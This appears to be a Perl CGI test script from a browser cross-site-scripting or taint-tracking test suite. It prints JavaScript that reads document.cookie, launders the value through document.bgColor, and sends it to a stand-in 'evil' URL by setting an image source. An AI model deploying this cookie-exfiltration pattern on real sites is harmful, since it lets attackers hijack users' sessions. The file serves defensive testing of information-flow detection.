#!/usr/bin/perl

require "xss_basic_vars.pl";

$title = "Test Basic";
$evil = "document.cookie";

require "xss_basic_uses.pl";

require "xss_basic_cookie.pl";

require "xss_basic_header.pl";

require "xss_basic_bodystart.pl";

print qq|
    <script type="text/javascript">
		var evil = $evil;
		document.bgColor = evil;
		var notevil = document.bgColor;
		var url = "$imgevilurl?test=" + notevil;
		document.images[0].src = url;
		
    </script>
|;

require "xss_basic_form.pl";

require "xss_basic_footer.pl";